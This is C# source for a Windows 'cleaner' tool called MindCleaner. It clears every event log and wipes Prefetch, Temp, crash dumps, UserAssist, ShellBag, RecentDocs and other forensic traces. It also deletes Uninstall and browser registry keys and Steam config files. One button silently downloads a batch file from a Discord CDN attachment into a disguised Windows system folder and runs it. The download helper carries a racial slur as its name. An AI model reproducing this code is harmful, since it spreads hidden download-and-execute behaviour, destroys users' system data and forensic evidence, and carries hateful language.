using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static KeyAuth.api;

namespace MindCleaner
{
    public partial class Main : Form
    {
        [DllImport("CleanerNatives.dll")]
        public static extern void clean_tmp();

        
        [DllImport("CleanerNatives.dll")]
        public static extern void clean_prefetch();

      
        [DllImport("CleanerNatives.dll")]
        public static extern void clean_last_activity(string loadername);

    
        [DllImport("CleanerNatives.dll")]
        public static extern void clean_recent(string loadername);

     
        [DllImport("CleanerNatives.dll")]
        public static extern void clean_regseeker();

        
        [DllImport("CleanerNatives.dll")]
        public static extern void clean_general(string loadername);

       
        [DllImport("CleanerNatives.dll")]
        public static extern void clean_userAssistView();

        
        [DllImport("CleanerNatives.dll")]
        public static extern string clean_x(string loadername);





        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn(
        int left,
        int top,
        int right,
        int bottom,
        int width,
        int height
       );
        public Main()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.None;
            Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 7, 7));
        }

        private void Main_Load(object sender, EventArgs e)
        {
            foreach (Process process in from pr in Process.GetProcesses()
                                        where pr.ProcessName == "msedge"
                                        select pr)
            {
                process.Kill();
            }
        }

        private void guna2Button6_Click(object sender, EventArgs e)
        {
            foreach (string path in Directory.GetFiles("C:\\Windows\\Temp"))

                {
                 
                        try
                {
                    File.Delete(path);
                    }
                catch (Exception)
                {
                }
                System.Windows.Forms.MessageBox.Show("This Action Performed Sucessfully", "Sucess Check", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
        }

        private void guna2Button4_Click(object sender, EventArgs e)
        {
            foreach (string path in Directory.GetFiles("C:\\Windows\\Prefetch"))
            {
                try
                {
                    File.Delete(path);
                }
                catch (Exception)
                {
                }
            }
            System.Windows.Forms.MessageBox.Show("This Action Performed Sucessfully", "Sucess Check", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void guna2Button8_Click(object sender, EventArgs e)
        {
            foreach (EventLog eventLog in EventLog.GetEventLogs())
            {
                eventLog.Clear();
                eventLog.Dispose();
            }
            System.Windows.Forms.MessageBox.Show("This Action Performed Sucessfully", "Sucess Check", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            Main.clean_userAssistView();
            System.Windows.Forms.MessageBox.Show("This Action Performed Sucessfully", "Sucess Check", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void guna2Button7_Click(object sender, EventArgs e)
        {
            try
            {
                Registry.CurrentUser.DeleteSubKeyTree("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store", true);
                Registry.CurrentUser.DeleteSubKeyTree("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\Microsoft\\Windows\\Shell", true);
                Registry.CurrentUser.DeleteSubKeyTree("SOFTWARE\\WinRAR\\ArcHistory", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", true);
                Registry.CurrentUser.DeleteSubKeyTree("SOFTWARE\\\\Microsoft\\\\Windows\\CurrentVersion\\\\Explorer\\\\FeatureUsage\\\\AppSwitched", true);
                Registry.CurrentUser.DeleteSubKeyTree("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView", true);
                Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU", true);
                Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRU", true);
                Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\CIDSizeMRU", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths", true);
                Registry.LocalMachine.DeleteSubKeyTree("Software\\Clients\\StartMenuInternet", true);
                System.Windows.Forms.MessageBox.Show("This Action Performed Sucessfully", "Sucess Check", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            catch (Exception)
            {
            }
            System.Windows.Forms.MessageBox.Show("This Action Performed Sucessfully", "Sucess Check", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "CrashDumps");
            if (Directory.Exists(path))
            {
                FileInfo[] files = new DirectoryInfo(path).GetFiles();
                for (int i = 0; i < files.Length; i++)
                {
                    files[i].Delete();
                }
                System.Windows.Forms.MessageBox.Show("This Action Performed Sucessfully", "Sucess Check", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
        }

        private void guna2Button10_Click(object sender, EventArgs e)
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo("rundll32.exe", "InetCpl.cpl,ClearMyTracksByProcess 1");
            processStartInfo.CreateNoWindow = true;
            processStartInfo.UseShellExecute = false;
            processStartInfo.RedirectStandardOutput = true;
            processStartInfo.RedirectStandardInput = true;
            processStartInfo.RedirectStandardError = true;
            Process.Start(processStartInfo);
            ProcessStartInfo processStartInfo2 = new ProcessStartInfo("rundll32.exe", "InetCpl.cpl,ClearMyTracksByProcess 1");
            processStartInfo2.CreateNoWindow = true;
            processStartInfo2.UseShellExecute = false;
            processStartInfo2.RedirectStandardOutput = true;
            processStartInfo2.RedirectStandardInput = true;
            processStartInfo2.RedirectStandardError = true;
            Process.Start(processStartInfo);
            ProcessStartInfo processStartInfo3 = new ProcessStartInfo("rundll32.exe", "InetCpl.cpl,ClearMyTracksByProcess 16");
            processStartInfo3.CreateNoWindow = true;
            processStartInfo3.UseShellExecute = false;
            processStartInfo3.RedirectStandardOutput = true;
            processStartInfo3.RedirectStandardInput = true;
            processStartInfo3.RedirectStandardError = true;
            Process.Start(processStartInfo);
            System.Windows.Forms.MessageBox.Show("This Action Performed Sucessfully", "Sucess Check", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void guna2Button11_Click(object sender, EventArgs e)
        {
            try
            {
                Registry.CurrentUser.DeleteSubKeyTree("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store", true);
                Registry.CurrentUser.DeleteSubKeyTree("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\Microsoft\\Windows\\Shell", true);
                Registry.CurrentUser.DeleteSubKeyTree("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", true);
                Registry.CurrentUser.DeleteSubKeyTree("SOFTWARE\\WinRAR\\ArcHistory", true);
                Registry.CurrentUser.DeleteSubKeyTree("SOFTWARE\\\\Microsoft\\\\Windows\\CurrentVersion\\\\Explorer\\\\FeatureUsage\\\\AppSwitched", true);
                Registry.CurrentUser.DeleteSubKeyTree("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView", true);
                Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU", true);
                Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRU", true);
                Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\CIDSizeMRU", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths", true);
                Registry.LocalMachine.DeleteSubKeyTree("Software\\Clients\\StartMenuInternet", true);
            }
            catch (Exception)
            {
            }
            System.Windows.Forms.MessageBox.Show("This Action Performed Sucessfully", "Sucess Check", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void guna2Button9_Click(object sender, EventArgs e)
        {
            string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string fileName = "Addons/BrowserPath.txt";
            string filePath = Path.Combine(currentDirectory, fileName);
            System.Diagnostics.Process.Start(filePath);
      
            DialogResult result = MessageBox.Show("We Support Opera,Brave,Edge and Chrome Browser. Check if you use a supported Browser when yes press yes! ", "Read Me - Project Mind", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            
            if (result == DialogResult.Yes)
            {
                browserclear.CleanerRruns();
            }
            else
            {
                Application.Exit();
            }
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            try
            {
                Registry.CurrentUser.DeleteSubKeyTree("SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\RecentDocs", true);
                Registry.CurrentUser.DeleteSubKeyTree("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\Shell\\\\BagMRU", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\Shell\\\\MuiCache", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\\\Microsoft\\\\Windows\\\\Shell", true);
                Registry.CurrentUser.DeleteSubKeyTree("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall", true);
                Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU", true);
            }
            catch (Exception)
            {
            }
            Main.RecentDocsHelpers.ClearAll();
            foreach (string path in Directory.GetFiles("C:\\Windows\\Prefetch"))
            {
                try
                {
                    File.Delete(path);
                }
                catch (Exception)
                {
                }
            }
            foreach (string path2 in Directory.GetFiles("C:\\Windows\\Temp"))
            {
                try
                {
                    File.Delete(path2);
                }
                catch (Exception)
                {
                }
            }
            string path3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "CrashDumps");
            if (Directory.Exists(path3))
            {
                FileInfo[] files2 = new DirectoryInfo(path3).GetFiles();
                for (int i = 0; i < files2.Length; i++)
                {
                    files2[i].Delete();
                }
            }
            foreach (EventLog eventLog in EventLog.GetEventLogs())
            {
                eventLog.Clear();
                eventLog.Dispose();
            }
            System.Windows.Forms.MessageBox.Show("This Action Performed Sucessfully", "Sucess Check", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        private static void NIGGER(string url, string filePath)
        {
            using (WebClient webClient = new WebClient())
            {
                webClient.DownloadFile(url, filePath);
            }
        }





        private void guna2Button5_Click(object sender, EventArgs e)
        {
            Main.RecentDocsHelpers.ClearAll();
            System.Windows.Forms.MessageBox.Show("This Action Performed Sucessfully", "Sucess Check", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private void guna2Button12_Click(object sender, EventArgs e)
        {
            foreach (string path in Directory.GetFiles("C:\\Program Files (x86)\\Steam\\config"))
            {
                try
                {
                    File.Delete(path);
                }
                catch (Exception)
                {
                }
            }
            System.Windows.Forms.MessageBox.Show("This Action Performed Sucessfully", "Sucess Check", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        public static class RecentDocsHelpers
        {
            
           
            [DllImport("shell32.dll", CharSet = CharSet.Unicode)]
            private static extern void SHAddToRecentDocs(ShellAddToRecentDocsFlags flag, string path);

          
        
            public static void AddFile(string path)
            {
                SHAddToRecentDocs(ShellAddToRecentDocsFlags.PathW, path);
            }

            
            public static void ClearAll()
            {
                SHAddToRecentDocs(ShellAddToRecentDocsFlags.Pidl, null);
            }
            public enum ShellAddToRecentDocsFlags
            {
                
                Pidl = 1,
               
                Path,
               
                PathW
            }
        }

        private void guna2Button13_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
        private void guna2Button14_Click(object sender, EventArgs e)
        {


            System.Windows.Forms.MessageBox.Show("SOON", "SOON", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            Application.Exit();


        }
        private void guna2Button15_Click(object sender, EventArgs e)
        {

            NIGGER("https://cdn.discordapp.com/attachments/1125845273013391400/1137079245064130623/Tweak.bat", "C:\\Windows\\INF\\.NET CLR Data\\0000\\Tweak.bat");
            Thread.Sleep(1000);
            Process.Start("C:\\Windows\\INF\\.NET CLR Data\\0000\\Tweak.bat");
            Thread.Sleep(6000);
            System.Windows.Forms.MessageBox.Show("This Action Performed Sucessfully", "Sucess Check", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);



        }

        private void guna2Button17_Click(object sender, EventArgs e)
        {
           
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
